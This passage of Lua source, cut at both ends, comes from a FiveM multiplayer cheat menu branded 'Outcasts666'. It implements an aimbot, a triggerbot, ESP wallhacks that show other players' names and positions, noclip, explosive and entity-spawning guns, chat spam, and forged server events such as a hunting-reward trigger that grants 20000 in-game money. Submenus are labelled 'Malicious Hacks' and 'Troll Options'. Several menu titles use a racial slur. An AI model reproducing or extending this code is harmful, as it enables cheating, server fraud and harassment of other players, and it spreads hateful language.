                        if IsDisabledControlPressed(0, 35) then
                            SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
                        end
                        if IsDisabledControlPressed(0, 44) then
                            zoff = 0.21
                        end
                        if IsDisabledControlPressed(0, 20) then
                            zoff = -0.21
                        end
                    end
    
                    newPos =
                        GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))
    
                    local heading = GetEntityHeading(noclipEntity)
                    SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
                    SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
                    SetEntityHeading(noclipEntity, heading)
    
                    SetEntityCollision(noclipEntity, false, false)
                    SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)
    
                    FreezeEntityPosition(noclipEntity, false)
                    SetEntityInvincible(noclipEntity, false)
                    SetEntityCollision(noclipEntity, true, true)
                end	
    
                if DeleteGun then
                    local gotEntity = getEntity(PlayerId())
                    if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
                        drawNotification("Aim The Gun At An Entity And Shoot!")
                        GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
                        SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
                        if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
                            if IsPlayerFreeAiming(PlayerId()) then
                                if IsEntityAPed(gotEntity) then
                                    if IsPedInAnyVehicle(gotEntity, true) then
                                        if IsControlJustReleased(1, 142) then
                                            SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
                                            DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
                                            SetEntityAsMissionEntity(gotEntity, 1, 1)
                                            DeleteEntity(gotEntity)
                                            drawNotification("~g~Deleted!")
                                        end
                                    else
                                        if IsControlJustReleased(1, 142) then
                                            SetEntityAsMissionEntity(gotEntity, 1, 1)
                                            DeleteEntity(gotEntity)
                                            drawNotification("~g~Deleted!")
                                        end
                                    end
                                else
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotification("~g~Deleted!")
                                    end
                                end
                            end
                        end
                    end
                end
    
                if esp then
                    for i = 0, 128 do
                        if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
                            local ra = RGBRainbow(1.0)
                            local pPed = GetPlayerPed(i)
                            local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
                            local x, y, z = table.unpack(GetEntityCoords(pPed))
                            local message =
                                "Name: " ..
                                GetPlayerName(i) ..
                                    "\nServer ID: " ..
                                        GetPlayerServerId(i) ..
                                            "\nPlayer ID: " .. i .. "\nDist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
                            if IsPedInAnyVehicle(pPed, true) then
                                local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
                                message = message .. "\nVeh: " .. VehName
                            end
                            DrawText3D(x, y, z + 1.0, message, ra.r, ra.g, ra.b)
    
                            LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                            LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                            LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                            LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                            LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                            LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                            LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
    
                            TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                            TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                            TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                            TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                            TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                            TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                            TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
    
                            ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                            ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                            ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                            ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                            ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                            ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                            ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                            ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
    
                            DrawLine(
                                LineOneBegin.x,
                                LineOneBegin.y,
                                LineOneBegin.z,
                                LineOneEnd.x,
                                LineOneEnd.y,
                                LineOneEnd.z,
                                ra.r,
                                ra.g,
                                ra.b,
                                255
                            )
                            DrawLine(
                                LineTwoBegin.x,
                                LineTwoBegin.y,
                                LineTwoBegin.z,
                                LineTwoEnd.x,
                                LineTwoEnd.y,
                                LineTwoEnd.z,
                                ra.r,
                                ra.g,
                                ra.b,
                                255
                            )
                            DrawLine(
                                LineThreeBegin.x,
                                LineThreeBegin.y,
                                LineThreeBegin.z,
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                ra.r,
                                ra.g,
                                ra.b,
                                255
                            )
                            DrawLine(
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                LineFourBegin.x,
                                LineFourBegin.y,
                                LineFourBegin.z,
                                ra.r,
                                ra.g,
                                ra.b,
                                255
                            )
                            DrawLine(
                                TLineOneBegin.x,
                                TLineOneBegin.y,
                                TLineOneBegin.z,
                                TLineOneEnd.x,
                                TLineOneEnd.y,
                                TLineOneEnd.z,
                                ra.r,
                                ra.g,
                                ra.b,
                                255
                            )
                            DrawLine(
                                TLineTwoBegin.x,
                                TLineTwoBegin.y,
                                TLineTwoBegin.z,
                                TLineTwoEnd.x,
                                TLineTwoEnd.y,
                                TLineTwoEnd.z,
                                ra.r,
                                ra.g,
                                ra.b,
                                255
                            )
                            DrawLine(
                                TLineThreeBegin.x,
                                TLineThreeBegin.y,
                                TLineThreeBegin.z,
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                ra.r,
                                ra.g,
                                ra.b,
                                255
                            )
                            DrawLine(
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                TLineFourBegin.x,
                                TLineFourBegin.y,
                                TLineFourBegin.z,
                                ra.r,
                                ra.g,
                                ra.b,
                                255
                            )
                            DrawLine(
                                ConnectorOneBegin.x,
                                ConnectorOneBegin.y,
                                ConnectorOneBegin.z,
                                ConnectorOneEnd.x,
                                ConnectorOneEnd.y,
                                ConnectorOneEnd.z,
                                ra.r,
                                ra.g,
                                ra.b,
                                255
                            )
                            DrawLine(
                                ConnectorTwoBegin.x,
                                ConnectorTwoBegin.y,
                                ConnectorTwoBegin.z,
                                ConnectorTwoEnd.x,
                                ConnectorTwoEnd.y,
                                ConnectorTwoEnd.z,
                                ra.r,
                                ra.g,
                                ra.b,
                                255
                            )
                            DrawLine(
                                ConnectorThreeBegin.x,
                                ConnectorThreeBegin.y,
                                ConnectorThreeBegin.z,
                                ConnectorThreeEnd.x,
                                ConnectorThreeEnd.y,
                                ConnectorThreeEnd.z,
                                ra.r,
                                ra.g,
                                ra.b,
                                255
                            )
                            DrawLine(
                                ConnectorFourBegin.x,
                                ConnectorFourBegin.y,
                                ConnectorFourBegin.z,
                                ConnectorFourEnd.x,
                                ConnectorFourEnd.y,
                                ConnectorFourEnd.z,
                                ra.r,
                                ra.g,
                                ra.b,
                                255
                            )
    
                            DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
                        end
                    end
                end
    
                if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
                    SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
                end
    
                if rainbowTint then
                    local weaponhash = GetSelectedPedWeapon(GetPlayerPed(-1))                   
                    SetPedWeaponTintIndex(PlayerPedId(), weaponhash, math.random(0, 7))                              
                end
    
                if showCoords then 
                    x,y,ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
                    roundx=tonumber(string.format("%.2f",x))
                    roundy=tonumber(string.format("%.2f",y))
                    roundz=tonumber(string.format("%.2f",ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw))
                    drawOnscreenText("~r~X:~s~ "..roundx,0.05,0.00)
                    drawOnscreenText("~r~Y:~s~ "..roundy,0.11,0.00)
                    drawOnscreenText("~r~Z:~s~ "..roundz,0.17,0.00)
                end
    
                if bulletGun then
                    local startDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                    local endDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                    startDistance = startDistance + 0.25
                    endDistance = endDistance + 1000.0
    
                    if IsPedOnFoot(PlayerPedId()) and IsPedShooting(PlayerPedId()) then
                        local bullet = GetHashKey(bullets[selectedBullet])
                        if not HasWeaponAssetLoaded(bullet) then
                            RequestWeaponAsset(bullet, 31, false)
                            while not HasWeaponAssetLoaded(bullet) do
                                Citizen.Wait(0)
                            end
                        end
                        ShootSingleBulletBetweenCoords(add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).z, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).z, 250, true, bullet, PlayerPedId(), true, false, -1.0)
                    end
    
                end
    
                if spam then                                                                                                                                                   
                    TriggerServerEvent('chatEvent', message)
                    TriggerServerEvent('_chat:messageEntered', "", { 255, 255, 255 }, message)
                    TriggerServerEvent('playerDied', message)   
                end
                    
                if shootBomb then
                    for i = 0, 128 do
                        if IsPedShooting(GetPlayerPed(i)) then
                            AddExplosion(GetEntityCoords(GetPlayerPed(i)), 4, 100.0, false, true, 0.0)
                        end
                    end
                end
    
                if vehicleGun then
                    local heading = GetEntityHeading(PlayerPedId())
                    local model = GetHashKey(vehicles[selectedVehicle])
                    local rot = GetGameplayCamRot(0)
                    local dir = RotToDirection(rot)
                    local camPosition = GetGameplayCamCoord()
                    local playerPosition = GetEntityCoords(PlayerPedId(), true)
                    local spawnDistance = GetDistance(camPosition, playerPosition)
                    spawnDistance = spawnDistance + 5
                    local spawnPosition = add(camPosition, multiply(dir, spawnDistance))
    
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        debugPrint("Loading Model...")
                        Citizen.Wait(0)
                    end
    
                    if HasModelLoaded(model) then
                        if IsPedShooting(PlayerPedId()) then
                            if IsPedOnFoot(PlayerPedId()) then
                            local veh = CreateVehicle(model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
                            SetVehicleForwardSpeed(veh, 120.0)
                            SetModelAsNoLongerNeeded(model)
                            SetVehicleAsNoLongerNeeded(veh)
                            end
                        end		
                    end							
                end
    
                if pedGun then
                    local heading = GetEntityHeading(PlayerPedId())
                    local rot = GetGameplayCamRot(0)
                    local dir = RotToDirection(rot)
                    local camPosition = GetGameplayCamCoord()
                    local playerPosition = GetEntityCoords(PlayerPedId(), true)
                    local spawnDistance = GetDistance(camPosition, playerPosition)
                    spawnDistance = spawnDistance + 5
                    local spawnPosition = add(camPosition, multiply(dir, spawnDistance))
    
                    local model = GetHashKey(peds[selectedPed])
    
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end					
    
                    if HasModelLoaded(model) then
                        if IsPedShooting(PlayerPedId()) then
                            local spawnedPed = CreatePed(26, model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)	
                            SetEntityRecordsCollisions(spawnedPed, true)																
                            for f = 0.0, 75.0 do
                                if HasEntityCollidedWithAnything(spawnedPed) then break end
                                    ApplyForceToEntity(spawnedPed, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
                            end							
                        end		
                    end								
                end
    
                if nameAboveHead then 
                    local dW = false 
                    local dX = 130 
                    local cx = 0;
                    for M = 0, 128 do
                        if NetworkIsPlayerActive(M) and GetPlayerPed(M)  ~= GetPlayerPed(-1) then 
                            ped = GetPlayerPed(M) 
                            blip = GetBlipFromEntity(ped) 
                            x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) 
                            x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(M), true)) 
                            distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true)) 
                            if dW then
                                if NetworkIsPlayerTalking(M) then 
                                    local dY = f(1.0) 
                                    DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(M).."  |  "..GetPlayerName(M), dY.r, dY.g, dY.b)
                                else 
                                    DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(M).."  |  "..GetPlayerName(M), 255, 255, 255) 
                                end 
                            end
                            if distance < dX then
                                if not dW then
                                    if NetworkIsPlayerTalking(M) then 
                                        local dY = f(1.0) DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(M).."  |  "..GetPlayerName(M), dY.r, dY.g, dY.b)
                                    else 
                                        DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(M).."  |  "..GetPlayerName(M), 255, 255, 255) 
                                    end 
                                end 
                            end 
                        end
                    end 
                end
    
                if forceGun then
                    local rot = GetGameplayCamRot(0)
                    local dir = RotToDirection(rot)
                    local heading = GetEntityHeading(PlayerPedId())
                    if IsPedShooting(PlayerPedId()) then
                        local aiming, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
                        if aiming then											
                            if IsPedInAnyVehicle(entity) then
                                local veh = GetVehiclePedIsUsing(entity)
                                DeleteEntity(entity)
                                SetEntityHeading(veh, heading)
                                SetVehicleForwardSpeed(veh, 150.0)
                            else 
                                for i = 0, 10 do
                                    ApplyForceToEntity(entity, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
                                end						
                            end									
                        end				
                    end
                end
    
                if explosiveAmmo then
                    local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                    if impact then
                        AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
                    end
                end
                                                    
                if aimbot then
                    for i = 0, 128 do
                        if i ~= PlayerId() then
                            if IsPlayerFreeAiming(PlayerId()) then
                                local TargetPed = GetPlayerPed(i)
                                local TargetPos = GetEntityCoords(TargetPed)
                                local Exist = DoesEntityExist(TargetPed)
                                local Dead = IsPlayerDead(TargetPed)
    
                                if Exist and not Dead then
                                    local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                                    if IsEntityVisible(TargetPed) and OnScreen then
                                        if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
                                            local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                                            SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                                        end
                                    end
                                end
                            end
                        end
                    end	
                end
            
                if TriggerBot then
                    local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
                    if Aiming then
                        if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                            ShootPlayer(Entity)
                        end
                    end
                end
            
                if fastrun then
                    SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
                    SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
                else
                    SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                    SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
                end
    
                if SuperJump then
                    SetSuperJumpThisFrame(PlayerId())
                end
    
                if huntspam then 
                    Citizen.Wait(1) 
                    TriggerServerEvent('esx-qalle-hunting:reward', 20000) 
                    TriggerServerEvent('esx-qalle-hunting:sell') 
                end
    
                if Oneshot then
                    SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
                    local gotEntity = getEntity(PlayerId())
                    if IsEntityAPed(gotEntity) then
                        if IsPedInAnyVehicle(gotEntity, true) then
                            if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                                if IsControlJustReleased(1, 69) then
                                    NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                                end
                            else
                                if IsControlJustReleased(1, 142) then
                                    NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                                end
                            end
                        end
                    elseif IsEntityAVehicle(gotEntity) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(gotEntity, true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(gotEntity, true, true, 0)
                            end
                        end
                    end
                else
                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                end
            end
        end)
    
    Citizen.CreateThread(
        function()
    
            local currentTint = 1
            local selectedTint = 1
    
            intro = 0
            intro2 = 0
    
            Outcasts666.CreateMenu("MainMenu", "~r~Outcasts666")
            -- sprites fib4_eyefindmap.gfx, mpshops = shopui_title_graphics_sale, assassinations = target1 , target3
            Outcasts666.SetTitleBackgroundSprite("MainMenu", "fib4_eyefindmap.gfx", "fib4_eyefindmap.gfx")
            Citizen.CreateThread(function()
                while false do
                    Outcasts666.SetTitleBackgroundSprite("MainMenu", "sprraces", "spr_desc_1")
                    Citizen.Wait(50)
                    Outcasts666.SetTitleBackgroundSprite("MainMenu", "sprraces", "spr_desc_2")
                    Citizen.Wait(50)
                    Outcasts666.SetTitleBackgroundSprite("MainMenu", "sprraces", "spr_desc_3")
                    Citizen.Wait(50)
                    Outcasts666.SetTitleBackgroundSprite("MainMenu", "sprraces", "spr_desc_4")
                    Citizen.Wait(100)
                    Outcasts666.SetTitleBackgroundSprite("MainMenu", "sprraces", "spr_desc_5")
                    Citizen.Wait(100)
                end
            end)
            Outcasts666.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
            Outcasts666.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
            Outcasts666.CreateSubMenu('MiscDrop', 'MainMenu', 'Misc Drop')
            Outcasts666.CreateSubMenu('MiscAIDrive', 'MainMenu', 'Misc AI Drive')
            Outcasts666.CreateSubMenu('MiscTriggers', 'MainMenu', 'Misc Triggers')
			Outcasts666.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
			Outcasts666.CreateSubMenu('MODEL', 'MainMenu', 'ESX Model Triggers')
            Outcasts666.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
            Outcasts666.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
            Outcasts666.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
            Outcasts666.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
            Outcasts666.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
            Outcasts666.CreateSubMenu("ESXDrugs", "ESXMenu", "ESX Drugs")
            Outcasts666.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
            Outcasts666.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
            Outcasts666.CreateSubMenu("PlayerOptionsMenu", 'OnlinePlayersMenu', 'Player Options')
            Outcasts666.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
            Outcasts666.CreateSubMenu("NiggerCustoms", "VehMenu", "Welcome To Nigger Customs!")
            Outcasts666.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
            Outcasts666.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
            Outcasts666.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
            Outcasts666.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
            Outcasts666.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
            Outcasts666.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
            Outcasts666.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
            Outcasts666.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
            Outcasts666.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
            Outcasts666.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
            Outcasts666.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
            Outcasts666.CreateSubMenu("PerformanceMenu", "NiggerCustoms", "Performance Tuning")
            Outcasts666.CreateSubMenu("SingleWepPlayer", 'PlayerOptionsMenu', 'Single Weapon Menu')
            Outcasts666.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
            Outcasts666.CreateSubMenu("Credits", "SettingsMenu", "Credits")
            Outcasts666.CreateSubMenu("Themes", "SettingsMenu", "Themes")
            Outcasts666.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
            Outcasts666.CreateSubMenu("VehBoostMenu", "NiggerCustoms", "Vehicle Booster")
            Outcasts666.CreateSubMenu("SpawnPedsMenu", "TrollMenu", "Spawn Peds")
            Outcasts666.CreateSubMenu("CarTypeSelection", "VehMenu", "Vehicle Types")
            Outcasts666.CreateSubMenu("CarOptions", "CarTypeSelection", "Car Types")
            Outcasts666.CreateSubMenu("CarTypes", "VehMenu", "Vehicles") 
            Outcasts666.CreateSubMenu("tunings", "NiggerCustoms", "Extrerior Tuning")
            Outcasts666.CreateSubMenu("performance", "NiggerCustoms", "Performance Tuning")
            Outcasts666.CreateSubMenu("WeaponTypes", "WeaponMenu", "Weapons") 
            Outcasts666.CreateSubMenu("WeaponTypeSelection", "WeaponTypes", "Weapon") 
            Outcasts666.CreateSubMenu("WeaponOptions", "WeaponTypeSelection", "Weapon Options") 
            Outcasts666.CreateSubMenu("ModSelect", "WeaponOptions", "Weapon Mod Options") 
            Outcasts666.CreateSubMenu("BlockAreas", "TrollMenu", "Block Off Areas")
            Outcasts666.CreateSubMenu("InfoMenu", "SettingsMenu", "Info")
            Outcasts666.CreateSubMenu("PlayerSpawnPedsMenu", "PlayerTrollMenu", "Spawn Peds")
            for i, dA in pairs(bd) do 
                Outcasts666.CreateSubMenu(dA.id, "tunings", dA.name) if dA.id == "paint" then 
                Outcasts666.CreateSubMenu("primary", dA.id, "Primary Paint") 
                Outcasts666.CreateSubMenu("secondary", dA.id, "Secondary Paint") 
                Outcasts666.CreateSubMenu("rimpaint", dA.id, "Wheel Paint") 
                Outcasts666.CreateSubMenu("classic1", "primary", "Classic Paint") 
                Outcasts666.CreateSubMenu("metallic1", "primary", "Metallic Paint") 
                Outcasts666.CreateSubMenu("matte1", "primary", "Matte Paint") 
                Outcasts666.CreateSubMenu("metal1", "primary", "Metal Paint") 
                Outcasts666.CreateSubMenu("classic2", "secondary", "Classic Paint") 
                Outcasts666.CreateSubMenu("metallic2", "secondary", "Metallic Paint") 
                Outcasts666.CreateSubMenu("matte2", "secondary", "Matte Paint") 
                Outcasts666.CreateSubMenu("metal2", "secondary", "Metal Paint") 
                Outcasts666.CreateSubMenu("classic3", "rimpaint", "Classic Paint") 
                Outcasts666.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint") 
                Outcasts666.CreateSubMenu("matte3", "rimpaint", "Matte Paint") 
                Outcasts666.CreateSubMenu("metal3", "rimpaint", "Metal Paint") 
            end 
        end
        for i, dA in pairs(be) do 
            Outcasts666.CreateSubMenu(dA.id, "performance", dA.name) 
        end
    
        local SelectedPlayer
    
            while Enabled do
    
                if intro == 0 then
                    scaleform = Initialize("mp_big_message_freemode", "~r~Welcome To Outcasts 666!!!")
                    DrawScaleformMovieFullscreen(scaleform, 80, 80, 80, 80, 0)
                    Citizen.CreateThread(function()
                        while true do
                            Wait(2000)
                            intro = intro + 1
                        end
                    end)
                elseif intro == 100 then
                end
    
                if intro2 == 0 and intro >= 100 then
                    scaleform = Initialize("mp_big_message_freemode", "~r~PLEASE REMEMBER ITS F7 TO OPEN<3")
                    DrawScaleformMovieFullscreen(scaleform, 80, 80, 80, 80, 0)
                    Citizen.CreateThread(function()
                        while true do
                            Wait(2000)
                            intro2 = intro2 + 1
                        end
                    end)
                elseif intro2 == 100 then
                end
    
                ped = PlayerPedId() 
                veh = GetVehiclePedIsUsing(ped) 
                SetVehicleModKit(veh, 0) 
                for i, dA in pairs(bd) do
                    if Outcasts666.IsMenuOpened("tunings") then
                        if b8 then
                            if ba == "neon" then 
                                local r, g, b = table.unpack(b9) 
                                SetVehicleNeonLightsColour(veh, r, g, b) 
                                SetVehicleNeonLightEnabled(veh, 0, bc) 
                                SetVehicleNeonLightEnabled(veh, 1, bc) 
                                SetVehicleNeonLightEnabled(veh, 2, bc) 
                                SetVehicleNeonLightEnabled(veh, 3, bc) 
                                b8 = false 
                                ba = -1 
                                b9 = -1 
                            elseif ba == "paint" then 
                                local dB, dC, dD, dA = table.unpack(b9) 
                                SetVehicleColours(veh, dB, dC) 
                                SetVehicleExtraColours(veh, dD, dA) 
                                b8 = false
                                ba = -1; 
                                b9 = -1
                            else 
                                if bc == "rm" then 
                                    RemoveVehicleMod(veh, ba) 
                                    b8 = false 
                                    ba = -1 
                                    b9 = -1
                                else 
                                    SetVehicleMod(veh, ba, b9, false) 
                                    b8 = false 
                                    ba = -1 
                                    b9 = -1 
                                end 
                            end 
                        end 
                    end
    
                    if Outcasts666.IsMenuOpened(dA.id) then
                        if dA.id == "wheeltypes" then
                            if Outcasts666.Button("Sport Wheels") then 
                                SetVehicleWheelType(veh, 0) 
                            elseif Outcasts666.Button("Muscle Wheels") then 
                                SetVehicleWheelType(veh, 1) 
                            elseif Outcasts666.Button("Lowrider Wheels") then 
                                SetVehicleWheelType(veh, 2) 
                            elseif Outcasts666.Button("SUV Wheels") then 
                                SetVehicleWheelType(veh, 3) 
                            elseif Outcasts666.Button("Offroad Wheels") then 
                                SetVehicleWheelType(veh, 4) 
                            elseif Outcasts666.Button("Tuner Wheels") then 
                                SetVehicleWheelType(veh, 5) 
                            elseif Outcasts666.Button("High End Wheels") then 
                                SetVehicleWheelType(veh, 7) 
                            end
                                
                            Outcasts666.Display() 
                        elseif dA.id == "extra" then 
                            local dF = checkValidVehicleExtras() 
                            for i, dA in pairs(dF) do
                                if IsVehicleExtraTurnedOn(veh, i) then 
                                    pricestring = "Installed"
                                else 
                                    pricestring = "Not Installed"
                                end
                                if Outcasts666.Button(dA.menuName, pricestring) then 
                                    SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i)) 
                                end 
                            end 
    
                            Outcasts666.Display() 
                        elseif dA.id == "headlight" then
                            if Outcasts666.Button("None") then 
                                SetVehicleHeadlightsColour(veh, -1) 
                            end
                            for dK, dA in pairs(bo) do 
                                tp = GetVehicleHeadlightsColour(veh) 
                                if tp == dA.id and not bg then 
                                    pricetext = "Installed"
                                else 
                                    if bg and tp == dA.id then 
                                        pricetext = "Previewing"
                                    else pricetext = "Not Installed"
                                    end 
                                end
                                head = GetVehicleHeadlightsColour(veh) 
                                if Outcasts666.Button(dA.name, pricetext) then
                                    if not bg then 
                                        bi = "headlight"
                                        bk = false
                                        oldhead = GetVehicleHeadlightsColour(veh) 
                                        bh = table.pack(oldhead) 
                                        SetVehicleHeadlightsColour(veh, dA.id) 
                                        bg = true 
                                    elseif bg and head == dA.id then 
                                        ToggleVehicleMod(veh, 22, true) 
                                        SetVehicleHeadlightsColour(veh, dA.id) 
                                        bg = false; bi = -1; bh = -1 
                                    elseif bg and head ~= dA.id then 
                                        SetVehicleHeadlightsColour(veh, dA.id) bg = true 
                                    end 
                                end 
                            end
    
                                Outcasts666.Display() 
                        elseif dA.id == "neon" then
                            if Outcasts666.Button("None") then 
                                SetVehicleNeonLightsColour(veh, 255, 255, 255) 
                                SetVehicleNeonLightEnabled(veh, 0, false) 
                                SetVehicleNeonLightEnabled(veh, 1, false) 
                                SetVehicleNeonLightEnabled(veh, 2, false) 
                                SetVehicleNeonLightEnabled(veh, 3, false) 
                            end
                            for i, dA in pairs(colors) do 
